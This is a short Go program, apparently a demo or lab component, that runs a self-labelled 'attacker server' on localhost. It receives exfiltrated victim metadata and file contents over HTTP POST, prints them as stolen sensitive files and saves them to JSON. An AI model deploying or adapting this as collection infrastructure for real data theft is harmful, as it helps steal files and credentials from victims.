package main

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strings"
	"time"
)

type ExfiltrationData struct {
	SessionID string                 `json:"session_id"`
	Timestamp string                 `json:"timestamp"`
	Files     map[string]string      `json:"files"`
	Metadata  map[string]string      `json:"metadata"`
}

func main() {
	fmt.Println("🔥 ATTACKER SERVER STARTED 🔥")
	fmt.Println("Listening on http://localhost:8080")
	fmt.Println("Waiting for exfiltrated data...")
	fmt.Println(strings.Repeat("=", 50))

	http.HandleFunc("/upload", handleUpload)
	
	log.Fatal(http.ListenAndServe(":8080", nil))
}

func handleUpload(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	// Read the request body
	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Failed to read body", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	// Parse the JSON data
	var data ExfiltrationData
	if err := json.Unmarshal(body, &data); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	// Display the exfiltrated data
	fmt.Printf("\n🎯 DATA EXFILTRATION DETECTED! 🎯\n")
	fmt.Printf("Time: %s\n", time.Now().Format("2006-01-02 15:04:05"))
	fmt.Printf("Session ID: %s\n", data.SessionID)
	fmt.Printf("Timestamp: %s\n", data.Timestamp)
	
	if data.Metadata != nil {
		fmt.Printf("Victim Info:\n")
		fmt.Printf("  Hostname: %s\n", data.Metadata["hostname"])
		fmt.Printf("  User: %s\n", data.Metadata["user"])
		fmt.Printf("  OS: %s\n", data.Metadata["os"])
	}

	fmt.Printf("\n📁 STOLEN SENSITIVE FILES:\n")
	fmt.Printf("%s\n", strings.Repeat("=", 50))
	
	for filePath, content := range data.Files {
		fmt.Printf("\n📄 File: %s\n", filePath)
		fmt.Printf("Content:\n%s\n", content)
		fmt.Printf("%s\n", strings.Repeat("-", 30))
	}

	// Save to file for evidence
	saveToFile(data)

	// Send response
	w.WriteHeader(http.StatusOK)
	w.Write([]byte("Data received successfully"))
}

func saveToFile(data ExfiltrationData) {
	filename := fmt.Sprintf("exfiltrated_data_%s.json", time.Now().Format("20060102_150405"))
	
	file, err := os.Create(filename)
	if err != nil {
		fmt.Printf("Error saving to file: %v\n", err)
		return
	}
	defer file.Close()

	jsonData, err := json.MarshalIndent(data, "", "  ")
	if err != nil {
		fmt.Printf("Error marshaling JSON: %v\n", err)
		return
	}

	file.Write(jsonData)
	fmt.Printf("\n💾 Data saved to: %s\n", filename)
} 